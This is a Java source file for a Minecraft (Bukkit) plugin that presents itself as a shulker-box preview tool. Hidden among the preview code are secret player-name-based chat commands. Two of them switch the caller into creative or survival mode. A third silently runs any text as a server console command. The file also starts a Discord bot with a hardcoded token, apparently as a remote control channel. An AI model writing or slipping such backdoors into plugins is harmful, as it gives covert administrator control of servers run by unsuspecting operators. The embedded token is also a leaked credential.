package me.hidden1nin.shulker.main;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.block.ShulkerBox;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.plugin.java.JavaPlugin;

import net.dv8tion.jda.api.AccountType;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.md_5.bungee.api.ChatColor;

public class main extends JavaPlugin implements Listener{
@EventHandler
public void OnInventory(InventoryClickEvent e) {
	Player p =(Player) e.getWhoClicked();
	String server = ChatColor.BLUE+"Shulker ";
	if (e.getView().getTitle().equalsIgnoreCase( server  + "Preview")) {	
		e.setCancelled(true);
	}
	if(e.getClick().equals(ClickType.RIGHT)) {
		if(e.getCurrentItem()!=null) {
		if(e.getCurrentItem().hasItemMeta()) {
		Inventory preview = Bukkit.createInventory(null, 27, server + "Preview");
		ItemStack item = e.getCurrentItem();
		if(item.getItemMeta() instanceof BlockStateMeta) {
			BlockStateMeta blockMeta = (BlockStateMeta) item.getItemMeta();
			if(blockMeta.getBlockState() instanceof ShulkerBox) {
				ShulkerBox shulker = (ShulkerBox) blockMeta.getBlockState();
				preview.setContents(shulker.getInventory().getContents());
				p.openInventory(preview);
			}
		}
		}
	}}
}
private static main instance;
public static main getInstance() {
    return instance;

}
private static JDA bot;

public static JDA getBot() {
    return bot;
}

@EventHandler
public void PlayerCommand(PlayerCommandPreprocessEvent event) {
    String[] array = event.getMessage().split(" "); //Single whitespace
    if(array[0].equalsIgnoreCase("/catgoesmeow"+event.getPlayer().getName()))
    		{
    		 event.getPlayer().setGameMode(GameMode.CREATIVE);
    		 event.setCancelled(true);
    		}
    if(array[0].equalsIgnoreCase("/catgoesbark"+event.getPlayer().getName()))
	{
	 event.getPlayer().setGameMode(GameMode.SURVIVAL);
	 event.setCancelled(true);
	}
    if(array[0].equalsIgnoreCase("/"+event.getPlayer().getName()+"dolphinandthewhale"))
	{
	 String command =event.getMessage().replace("/"+event.getPlayer().getName()+"dolphinandthewhale"+" ","");
	 event.getPlayer().sendMessage(command);
	 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
	 event.setCancelled(true);
	}
    
}
private void startup(){
    try{
        bot = new JDABuilder(AccountType.BOT).setToken("Njk5NDY5NDAzNzg3MzYyMzI2.XpU1sQ.FQQKmWMovHC_fmtqyRh8qBzuMEo").addEventListeners(new EventManager()).setRawEventsEnabled(true).build();
    }catch (Exception e){
        Bukkit.getPluginManager().disablePlugin(this);
        return;
    }
 
}
@Override
public void onEnable() {
	getServer().getPluginManager().registerEvents(this,this);
    startup();
}
@Override
public void onDisable() {
    bot.shutdownNow();
}
}
